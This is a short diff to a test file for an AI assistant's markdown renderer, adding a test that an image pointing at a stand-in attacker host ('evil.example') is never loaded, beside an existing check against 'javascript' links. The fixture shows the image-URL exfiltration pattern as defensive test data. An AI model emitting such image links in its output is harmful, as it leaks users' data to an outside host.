@@ -38,4 +38,10 @@ describe('AssistantMarkdown', () => {
 
     expect(screen.getByText('click').closest('a')?.getAttribute('href') ?? '').not.toContain('javascript');
   });
+
+  it('never loads an image the model asks for', () => {
+    const { container } = render(<AssistantMarkdown text="![secret](https://evil.example/?q=1)" />);
+
+    expect(container.querySelector('img')).toBeNull();
+  });
 });
